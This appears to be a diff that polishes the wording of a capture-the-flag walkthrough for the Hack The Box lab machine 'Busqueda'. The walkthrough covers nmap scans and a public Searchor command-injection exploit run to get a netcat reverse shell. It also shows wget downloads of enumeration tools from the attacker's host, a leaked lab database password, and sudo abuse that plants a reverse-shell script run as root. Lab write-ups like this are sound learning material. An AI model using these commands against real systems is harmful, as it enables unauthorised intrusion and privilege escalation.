@@ -12,33 +12,33 @@ aliases:
 
 ![800](../../0.%20Assets/Busqueda-1788730613603.webp)
 
-This was not easy whatsoever the foothold yes okay it took me 10 minutes literally but the privilege escalation had a lot of rabbit holes and stuff
+This one wasn't easy. The foothold was quick, maybe ten minutes, but the privilege escalation was full of rabbit holes.
 
 ---
 
 # Walkthrough
 
-We will start with the basics, let's do an `nmap` scan to see what this machine has to offer.
+Let's start with the basics and run an `nmap` scan to see what the machine is exposing.
 
-First let's find the ports
+First, I'll enumerate the open ports.
 
 ```
 nmap -sS -p- $T --min-rate 5000 -oG openPorts
 ```
 
-- `$T` is a variable i created to store the IP of the target machine
+- `$T` is a variable I use to hold the target's IP address.
 
-We are  storing it in a `grepable` format because i have a little functionality called `"ExtractPorts"` in my `zsh` that takes a file and with grep copies the open ports to the clipboard do we don't have to write them manually and/or scan for all ports again
+I save the results in a `grepable` format because I have a small `zsh` function called `"ExtractPorts"` that reads the file and copies the open ports straight to the clipboard. That saves me from typing them out by hand or scanning the full range again.
 
-Here you can find the dotfiles for the kali I created -> [Dotfiles](https://github.com/MarcussanMG/kali-dotfiles)
+You can find the Kali dotfiles I put together here -> [Dotfiles](https://github.com/MarcussanMG/kali-dotfiles)
 
-Once we have the ports, we will do another `nmap` going more in detail
+With the ports in hand, I'll run a second, more detailed `nmap` scan.
 
 ```
 nmap -sS -p 22,80 --min-rate 5000 -Pn -n -sVC -oN results.txt -v $T
 ```
 
-This will result in a file with the result of the `nmap`
+This writes the scan results to a file.
 
 ```
 ┌─[bl1nk㉿kali]─[~/engagements/busqueda/nmap]─[󰦝 10.10.15.150]─[ 10.129.228.217]
@@ -66,30 +66,29 @@ This will result in a file with the result of the `nmap`
 
 ```
 
-There is not much to see here, so let's enter the webserver and see what we can find
+There isn't much to work with, so let's head to the web server and see what it hosts.
 
-It looks like it is not finding the website, so let's add it to our `/etc/hosts` to see if the resolution in name helps
+The site doesn't resolve at first, so let's add it to `/etc/hosts` and see if name resolution fixes it.
 
 ![](../../0.%20Assets/Busqueda-1788731537507.webp)
 
-Luckily we know the name of the server because of the title (nmap snitched hahaha)
+We already know the server name from the `nmap` title field, which was kind enough to leak it.
 
-
-Once we enter the site we can see a searcher for engines and some version disclosure
+Once the site loads, we see a search tool for engines along with some version disclosure.
 
 ![](../../0.%20Assets/Busqueda-1788732635230.webp)
 
-So i found this [exploit](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection/blob/main/exploit.sh)
+I found this [exploit](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection/blob/main/exploit.sh)
 
-So I read the documentation and apparently I only need to start a `netcat` listener on port `9001` which is the default by the script and run the script
+Reading the documentation, all I need to do is start a `netcat` listener on port `9001`, which is the script's default, and then run the script.
 
 ```
 rlwrap nc -nlvp 9001
 ```
 
-- I encapsulated the `netcat listener` with `rlwrap` to stabilize the shell
+- I wrapped the `netcat listener` in `rlwrap` to stabilize the shell.
 
-and then I run the script as the documentation explained.
+Then I run the script as the documentation describes.
 
 ```
 ./exploit.sh searcher.htb 10.10.15.150 9001
@@ -97,11 +96,11 @@ and then I run the script as the documentation explained.
 
 ![](../../0.%20Assets/Busqueda-1788732986819.webp)
 
-And in the `home` directory we can find the user flag
+In the `home` directory we find the user flag.
 
 ![](../../0.%20Assets/Busqueda-1788733022791.webp)
 
-With my custom command `serve` I started a python webserver to retrieve `linpeas.sh` and `linux-exploit-suggester.sh` from the target
+Using my custom `serve` command, I started a Python web server to transfer `linpeas.sh` and `linux-exploit-suggester.sh` onto the target.
 
 Then from the target:
 
@@ -110,57 +109,57 @@ wget http://10.10.15.150/linpeas.sh
 wget http://10.10.15.150/linux-exploit-suggester.sh
 ```
 
-For the privilege escalation, I looked everywhere and didn't find much until I came back to the path we where dropped in and saw the `.git` directory
+For privilege escalation I looked everywhere without much to show for it, until I came back to the directory we landed in and noticed the `.git` folder.
 
 ![](../../0.%20Assets/Busqueda-1788735563837.webp)
 
-And inside found a `config` file
+Inside it, I found a `config` file.
 
 ![](../../0.%20Assets/Busqueda-1788735641485.webp)
 
-We can see `gitea.searcher.htb` so we can add that to our `/etc/hosts` file for name resolution and with a bit of luck find more information there
+It references `gitea.searcher.htb`, so let's add that to `/etc/hosts` for name resolution and hope it leads somewhere.
 
-And look at that
+And there it is.
 
 ![|602x473](../../0.%20Assets/Busqueda-1788736111505.webp)
 
-Seems like we need to sign in so let's look for some credentials
+We need to sign in, so let's go looking for credentials.
 
-Inside of the `logs` directory in `.git` we can find what looks to be a username
+Inside the `logs` directory under `.git`, we find what looks like a username.
 
 ![](../../0.%20Assets/Busqueda-1788736349104.webp)
 
-So we will remember `administrator`
+Let's keep `administrator` in mind.
 
-Okay, I was doing some fuzzing with `gobuster` and apparently we can find the user `administrator` directly as  a page
+While fuzzing with `gobuster`, I found that the user `administrator` is reachable directly as a page.
 
 ![544](../../0.%20Assets/Busqueda-1788736570669.webp)![|892x389](../../0.%20Assets/Busqueda-1788736702944.webp)
 
-There wasn't anything interesting
+Nothing interesting there.
 
-Moving around the page I also found another user called `Cody`
+Browsing the page, I also came across another user named `Cody`.
 
 ![](../../0.%20Assets/Busqueda-1788736656512.webp)
 
-And i realized we had the credentials for cody all this time like a dummy (ive spent more than an hour looking for them hahaha)
+Then I realized we'd had Cody's credentials all along, after spending more than an hour hunting for them.
 
 ![](../../0.%20Assets/Busqueda-1788737934074.webp)
 
-Inside there is a hidden repository
+Inside, there's a hidden repository.
 
 ![](../../0.%20Assets/Busqueda-1788738008060.webp)
 
-I looked through it and didn't find anything crazy
+I went through it and didn't find anything notable.
 
-so now that we have a credential let's try again from the machine
+Now that we have a credential, let's go back to the machine and try again.
 
-first import a proper shell
+First, let's upgrade to a proper shell.
 
 ```
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-now let's check for sudo permissions
+Now let's check our sudo permissions.
 
 ```
 sudo -l
@@ -180,9 +179,9 @@ User svc may run the following commands on busqueda:
     (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
 ```
 
-So we can see a script running as python, let's read what it does
+We can run a Python script as root, so let's find out what it does.
 
-we can't `cat` into it so let's try running it
+We can't `cat` the file, so let's just run it.
 
 ```
 svc@busqueda:/var/www/app$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *                                                        
@@ -198,19 +197,19 @@ svc@busqueda:/var/www/app$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py 
 
 ![](../../0.%20Assets/Busqueda-1788738520389.webp)
 
-And wow, okay we see some docker containers, looks like a `mysql` and the `gitea` itself
+We can see a couple of docker containers, one that looks like `mysql` and the `gitea` instance itself.
 
-It seems interesting to me that the ssh port is mapped, let's see if we can go inside
+The mapped SSH port caught my eye, so let's see if we can get inside.
 
 ![](../../0.%20Assets/Busqueda-1788738936000.webp)
 
-Okay so I tried the last command `"docker-inspect"`
+Next I tried the `"docker-inspect"` action.
 
 ```
 sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' 960873171e2e
 ```
 
-(I am not going to lie, I got to this point but this last command I had to look up)
+I'll be honest, I worked out everything up to here on my own, but I had to look up this last command.
 
 
 ![](../../0.%20Assets/Busqueda-1788739131102.webp)
@@ -220,15 +219,15 @@ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}'
 | -------- | ----- | ----------------- |
 | gitea    | gitea | yuiu1hoiu4i5ho1uh |
 
-Cool, let's try connecting to the database and see what we can find
+Let's connect to the database and see what's in there.
 
-I came back and logged in as `Administrator`
+I went back and logged in as `Administrator`.
 
 ![](../../0.%20Assets/Busqueda-1788740410655.webp)
 
-And the found the source code for the `checkup` script
+There I found the source code for the `checkup` script.
 
-`Fullcheckup` wasn't working for me before let's see now that we found the source code
+`Fullcheckup` hadn't worked for me earlier, so let's revisit it now that we have the source.
 
 
 
@@ -244,11 +243,11 @@ find / -name full-checkup.sh 2>/dev/null
 
 ![](../../0.%20Assets/Busqueda-1788741472131.webp)
 
-And from there it works
+From there it works.
 
-So this tells us that the script reads from where currently are and runs a script called `full-checkup` and runs it as `root` so why don't we move to a path where we can write (like `/tmp`) and write our own script that will be executed by root.
+This tells us the script runs `full-checkup.sh` from the current working directory as `root`. So let's move to a directory we can write to, like `/tmp`, and drop in our own `full-checkup.sh` for root to execute.
 
-So i created a script that sends me a reverse shell, and because root is the one which will be sending me the reverse shell then i will have root permissions
+I wrote a script that sends me a reverse shell. Since root is the one running it, the shell comes back with root privileges.
 
 ![](../../0.%20Assets/Busqueda-1788743147056.webp)
 
